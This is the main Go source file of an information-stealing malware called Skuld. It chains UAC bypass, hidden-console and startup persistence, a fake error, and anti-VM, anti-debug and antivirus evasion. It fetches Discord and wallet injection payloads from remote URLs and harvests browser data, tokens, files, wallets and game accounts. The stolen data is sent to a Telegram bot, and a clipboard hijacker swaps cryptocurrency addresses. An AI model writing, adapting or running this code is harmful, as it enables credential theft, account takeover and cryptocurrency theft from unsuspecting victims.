package main

import (
	"fmt"
	"log"
	"sync"

	"github.com/hackirby/skuld/modules/antidebug"
	"github.com/hackirby/skuld/modules/antivm"
	"github.com/hackirby/skuld/modules/antivirus"
	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/modules/clipper"
	"github.com/hackirby/skuld/modules/commonfiles"
	"github.com/hackirby/skuld/modules/discodes"
	"github.com/hackirby/skuld/modules/discordinjection"
	"github.com/hackirby/skuld/modules/fakeerror"
	"github.com/hackirby/skuld/modules/games"
	"github.com/hackirby/skuld/modules/hideconsole"
	"github.com/hackirby/skuld/modules/startup"
	"github.com/hackirby/skuld/modules/system"
	"github.com/hackirby/skuld/modules/tokens"
	"github.com/hackirby/skuld/modules/uacbypass"
	"github.com/hackirby/skuld/modules/wallets"
	"github.com/hackirby/skuld/modules/walletsinjection"
	"github.com/hackirby/skuld/utils/program"
	"github.com/hackirby/skuld/utils/collector"
)

func main() {
	CONFIG := map[string]interface{}{
		"bot_token": "", // Telegram Bot Token
		"chat_id":   "", // Telegram Chat ID
		"cryptos": map[string]string{
			"BTC": "",
			"BCH": "",
			"ETH": "",
			"XMR": "",
			"LTC": "",
			"XCH": "",
			"XLM": "",
			"TRX": "",
			"ADA": "",
			"DASH": "",
			"DOGE": "",
		},
	}

	// Validate Telegram configuration
	if CONFIG["bot_token"].(string) == "" || CONFIG["chat_id"].(string) == "" {
		log.Fatal("Please configure bot_token and chat_id in CONFIG")
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()

	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go fakeerror.Run()
		go startup.Run()
	}

	antivm.Run()
	go antidebug.Run()
	go antivirus.Run()

	// Initialize data collector
	dataCollector := collector.NewDataCollector(
		CONFIG["bot_token"].(string),
		CONFIG["chat_id"].(string),
	)
	defer dataCollector.Cleanup()

	// Send startup message
	dataCollector.SendMessage("🚀 Skuld started data collection...")

	// Start injection modules (non-blocking)
	go discordinjection.Run(
		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
		dataCollector,
	)
	go walletsinjection.Run(
		"https://github.com/hackirby/wallets-injection/raw/main/atomic.asar",
		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
		dataCollector,
	)

	// Run data collection modules in parallel
	actions := []func(*collector.DataCollector){
		system.Run,
		browsers.Run,
		tokens.Run,
		discodes.Run,
		commonfiles.Run,
		wallets.Run,
		games.Run,
	}

	// Wait for all modules to complete
	var wg sync.WaitGroup
	for _, action := range actions {
		wg.Add(1)
		go func(fn func(*collector.DataCollector)) {
			defer wg.Done()
			fn(dataCollector)
		}(action)
	}

	// Wait for all data collection modules to complete
	wg.Wait()

	// Send all collected data via Telegram
	if err := dataCollector.SendCollectedData(); err != nil {
		log.Printf("Failed to send collected data: %v", err)
		dataCollector.SendMessage(fmt.Sprintf("❌ Error sending data: %v", err))
	} else {
		dataCollector.SendMessage("✅ Data collection and transmission completed successfully!")
	}

	// Start clipper (runs indefinitely in background)
	clipper.Run(CONFIG["cryptos"].(map[string]string))
}
